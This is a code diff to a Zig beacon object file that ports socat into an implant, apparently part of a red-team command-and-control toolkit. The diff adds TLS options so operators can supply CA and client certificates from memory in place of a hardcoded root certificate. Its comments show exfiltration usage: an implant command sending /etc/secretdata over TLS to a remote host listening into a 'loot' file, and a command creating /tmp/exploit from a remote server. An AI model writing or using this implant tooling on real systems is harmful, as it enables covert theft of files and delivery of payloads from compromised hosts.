@@ -18,6 +18,10 @@
 ///   TCP:<host:port>
 ///   TLS:<host:ssl-enabled port>
 ///
+/// Options for TLS address type:
+///   cacert BUF_LEN BUF_MEMORY_ADDRESS
+///   cert BUF_LEN BUF_MEMORY_ADDRESS
+///
 /// Example use case 1: out-of-band data fetch from remote server:
 ///
 ///   Setting up data server:
@@ -38,7 +42,7 @@
 ///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
 ///
 ///   In the implant:
-///     z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
+///     z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443:cacert,cert file=./cacert.pem file=./cert.pem
 ///   Using cli4bofs:
 ///     $ cli4bofs exec socat CREATE:/tmp/exploit TLS:remotehost:8443
 ///arguments:
@@ -50,6 +54,45 @@
 ///  desc: "offset in overwritten file"
 ///  type: string
 ///  required: true
+///- name: BufLen
+///  desc: "length of UDP probes buffer"
+///  type: integer
+///  required: false
+///- name: BufMemoryAddress
+///  desc: "memory address of UDP probes buffer"
+///  type: string
+///  required: false
+///  errors:
+///- name: AccessDenied
+///  code: 0x1
+///  message: ""
+///- name: NoArgsProvided
+///  code: 0x2
+///  message: ""
+///- name: BadArgsProvided
+///  code: 0x3
+///  message: ""
+///- name: NotSupportedAddressType
+///  code: 0x4
+///  message: ""
+///- name: NoSuchFile
+///  code: 0x5
+///  message: ""
+///- name: ConnectionError
+///  code: 0x7
+///  message: ""
+///- name: DataTransferError
+///  code: 0x8
+///  message: ""
+///- name: ReadFailedError
+///  code: 0x9
+///  message: ""
+///- name: NoCaCertProvided
+///  code: 0xa
+///  message: ""
+///- name: UnknownError
+///  code: 0xb
+///  message: ""
 const std = @import("std");
 const posix = @import("std").posix;
 const bofapi = @import("bof_api");
@@ -83,6 +126,7 @@ const BofErrors = enum(u8) {
     ConnectionError,
     DataTransferError,
     ReadFailedError,
+    NoCaCertProvided,
     UnknownError,
 };
 
@@ -95,28 +139,10 @@ const AddressType = enum(u8) {
     UNRECOGNIZED,
 };
 
-const minica_pem =
-\\-----BEGIN CERTIFICATE-----
-\\MIIDPzCCAiegAwIBAgIIa/kXZJi16EYwDQYJKoZIhvcNAQELBQAwIDEeMBwGA1UE
-\\AxMVbWluaWNhIHJvb3QgY2EgNmJmOTE3MCAXDTI2MDUyNTEwMjMxMloYDzIxMjYw
-\\NTI1MTAyMzEyWjAgMR4wHAYDVQQDExVtaW5pY2Egcm9vdCBjYSA2YmY5MTcwggEi
-\\MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDFguKvyy3iUvvLJDDlIiaIINh6
-\\kUxDNC25df7emhhTFUXJMfZAPjXlz6l9I63Im/TJqQE8Dv2oEtcwD2OmHIdMIk/i
-\\wSe/+8uC1QjqOBLSsfflfx2Say4OlvOCIrRy8QPqnRq3+U/I1wGIEe1ADH5UT+Dj
-\\hcDitJbgKLdCJXlDSClPj5cCGEAPiuyM+kGW4MmY/2Gd9BVo2VTixXUBexTsV8ts
-\\Lu3JRZqBzJuT4XZQ8qLRaXx/Xssgp+cxyoUsnFChWCBnev8uijJWTlSNkt/Rppt8
-\\rvE6PoIXqvLn8oZ3f+2fO6j3j1pI+uXoBZkKnAi84InZRpbSLBmNHgnRndt9AgMB
-\\AAGjezB5MA4GA1UdDwEB/wQEAwIChDATBgNVHSUEDDAKBggrBgEFBQcDATASBgNV
-\\HRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBRn8LqQx8ZriglHcRLfdriR6ibn/zAf
-\\BgNVHSMEGDAWgBRn8LqQx8ZriglHcRLfdriR6ibn/zANBgkqhkiG9w0BAQsFAAOC
-\\AQEATlkzeKYzFLNXmDBV8zC951SMBsD36Gi/plwMmK8Bp117t5OGIPgE1JGZZxZq
-\\ycVf/pejZlDkNl3VnbtWnnmQIzswpKoL59XJL/x/U/KBCmEURlQLAh6RlchL3rfj
-\\Mz3T4ImG6N5IJv7Z61wTWqtIK1/t3dedoMpte/3oyK43NNQfRkiW7x7HGZHSa+lq
-\\4ubgW+U9JSfdCDM7rgl6zXmpVZD8Ddo7IGuSiRULtIsSpAKEXOBzC63xB+QUCXta
-\\8xMY4HSQQ8uXNnZm4kURKOcoMXxXv8OLsknJ40GOTtkULU0m2RK4D1lQMC8w0RRe
-\\AO8i38yIm9foRIBxdVT/dDUG2w==
-\\-----END CERTIFICATE-----
-;
+var cacert_bytes: ?[]const u8 = null;
+
+var cacert: bool = false;
+//var clientCert: bool = false;
 
 fn addCertsFromMemory(cb: *std.crypto.Certificate.Bundle, alloc: std.mem.Allocator, cert_buf: []const u8) std.crypto.Certificate.Bundle.AddCertsFromFileError!void {
 
@@ -165,6 +191,27 @@ fn checkAddressType(addr_type: []const u8) AddressType {
         return AddressType.UNRECOGNIZED;
 }
 
+fn processTlsOptions(parser: *beacon.datap, sink_addr_iter: *std.mem.SplitIterator(u8, .scalar)) void {
+    const sinkTlsOpts = sink_addr_iter.next() orelse return;
+    var opt_iter = std.mem.splitScalar(u8, sinkTlsOpts, ',');
+    while (opt_iter.next()) |opt| {
+
+        // TLS CA certificate for server's cert verification
+        if(std.mem.eql(u8, "cacert", opt)) {
+            bofapi.print(.output, "opt {s}", .{opt});
+            cacert_bytes = blk: {
+                const cacert_len = beacon.dataInt(parser);
+                const cacert_ptr: *const [@sizeOf(usize)]u8 = @ptrCast(beacon.dataExtract(parser, null));
+                break :blk @as([*]const u8, @ptrFromInt(std.mem.readInt(usize, cacert_ptr, .little)))[0..@intCast(cacert_len)];
+            };
+        }
+        // client TLS certificate (mTLS)
+        else if(std.mem.eql(u8, "cert", opt)) {
+            bofapi.print(.output, "opt {s}", .{opt});
+        }
+    } 
+}
+
 pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     @import("bof_api").init(adata, alen, .{});
 
@@ -199,9 +246,9 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     var sinkAddrType: AddressType = undefined;
     var sink_addr_iter: std.mem.SplitIterator(u8, .scalar) = undefined;
 
+    var opt_len: i32 = 0;
     const src_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
-    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, null).?, 0);
-
+    const sink_address = std.mem.sliceTo(beacon.dataExtract(&parser, &opt_len).?, 0);
 
     if(std.mem.eql(u8, "-", std.mem.sliceTo(src_address, 0)))
         srcAddrType = AddressType.STDIN;
@@ -226,13 +273,19 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
         var reader = tcp_src.?.reader(&r_buffer);
         r_iface = reader.interface();
 
-        if (srcAddrType == AddressType.TLS) {
+        if (srcAddrType == AddressType.TLS) { 
+
             var tls_writer = tcp_src.?.writer(&tls_buf);
 
             var root_ca: std.crypto.Certificate.Bundle = .{};
-            const s: []const u8 = minica_pem[0..minica_pem.len];
-            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
             defer root_ca.deinit(allocator);
+
+            // iterate thru TLS options if any
+            processTlsOptions(&parser, &src_addr_iter);
+
+            if(cacert_bytes) |cert| {
+                addCertsFromMemory(&root_ca, allocator, cert) catch return @intFromEnum(BofErrors.NoCaCertProvided);
+            }
 
             var diagnostic: tls.config.Client.Diagnostic = .{};
 
@@ -290,9 +343,14 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
             var tls_reader = tcp_sink.?.reader(&tls_buf);
 
             var root_ca: std.crypto.Certificate.Bundle = .{};
-            const s: []const u8 = minica_pem[0..minica_pem.len];
-            addCertsFromMemory(&root_ca, allocator, s) catch return 94;
             defer root_ca.deinit(allocator);
+
+            // iterate thru TLS options if any
+            processTlsOptions(&parser, &sink_addr_iter);
+
+            if(cacert_bytes) |cert| {
+                addCertsFromMemory(&root_ca, allocator, cert) catch return @intFromEnum(BofErrors.NoCaCertProvided);
+            }
 
             var diagnostic: tls.config.Client.Diagnostic = .{};
 
